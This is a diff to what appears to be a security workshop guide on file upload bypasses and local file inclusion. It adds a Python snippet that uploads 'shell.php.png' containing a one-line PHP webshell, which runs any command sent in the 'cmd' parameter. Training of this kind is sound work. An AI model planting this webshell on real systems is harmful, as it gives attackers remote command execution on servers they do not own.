@@ -23,7 +23,13 @@ Vulnerable Code : https://gist.github.com/dreamcast65/1d7fd96893d70d4c85e649b358
 While it may be beneficial to test for other types of file extension bypasses the bypass we will use for this workshop will be .php.png
 
 Vulnerable Code : https://gist.github.com/dreamcast65/c91bd12384d33b2fb4067cd9bc989be0#file-file-upload-bypass
+        
+Code To make a webshell:
 
+    uploaded_file = "shell.php.png"
+    files = {'image':(uploaded_file, "<?php if(isset($_REQUEST['cmd'])){ echo \"<pre>\"; $cmd =($_REQUEST['cmd']);system($cmd);echo \"</pre>\";die;}?>")
+	    }
+        
 ## Local file Inclusion
 * Owasp LFI - https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
 * LFI cheatsheet - https://highon.coffee/blog/lfi-cheat-sheet/
